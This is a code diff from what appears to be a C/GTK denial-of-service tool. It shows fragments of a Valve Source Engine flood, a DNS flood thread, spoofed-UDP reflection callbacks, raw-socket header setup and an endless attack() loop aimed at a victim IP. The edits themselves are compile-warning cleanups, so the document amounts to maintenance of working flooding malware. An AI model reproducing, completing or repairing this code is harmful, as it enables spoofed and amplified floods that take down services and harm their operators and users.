@@ -34,7 +34,7 @@ static unsigned int floodport;
 //static uint32_t Q_chargen[4096], c_chargen = 362436;
 
 /** VALVE SOURCE ENGINE DDOS **/
-static unsigned int floodport_vse;
+//static unsigned int floodport_vse;
 volatile int limiter_vse;
 //volatile unsigned int pps;
 volatile unsigned int sleeptime = 100;
@@ -698,7 +698,7 @@ void setup_ip_header(struct iphdr *iph)
     iph->ttl = MAXTTL;
     iph->protocol = 6;
     iph->check = 0;
-    iph->saddr = inet_addr(Your_IP);        /** IIIIIICIIIIIIII **/
+    iph->saddr = inet_addr(Your_IP);
 }
 
 void setup_tcp_header(struct tcphdr *tcph)
@@ -1584,7 +1584,7 @@ void *flood_dns(void *par1)
 
         unsigned char *qname = (unsigned char*) &strPacket[iPayloadSize + iAdditionalSize];
 
-        strcpy(strDomain, list_node->domain);
+        strcpy((char*)strDomain, list_node->domain);
         ChangetoDnsNameFormat(qname, strDomain);            /*** IIIIIIIIIIIICIIIIIIII ***/
 
         iAdditionalSize += strlen(qname) + 1;
@@ -1870,7 +1870,7 @@ void cb_udp_spoofed(void)
 }
 
 
-void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, char *message)
+void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, const char *message)
 {
     int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
 
@@ -1932,7 +1932,7 @@ void *thread_attack(void *thread_params)
 
 	while (1)
 		for (i = 0; i < params->list_size; i++)
-			attack(params->list[i].ip, rand() % 65534 + 1, params->victim_ip, params->list[i].port, params->message);
+			attack(params->list[i]. ip, rand() % 65534 + 1, params->victim_ip, params->list[i].port, params->message);
 }
 
 char *getLine(FILE *f)
@@ -2118,7 +2118,11 @@ void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
 
-    return 0;
+    /* unused parameters */
+    (void)button;
+    (void)user_data;
+
+    return;
 }
 
 
@@ -2186,9 +2190,6 @@ void *flood_vse(void *par1)
     }
 
     init_rand(time(NULL));
-
-    register unsigned int i;
-    i = 0;
 
     while(1)
     {
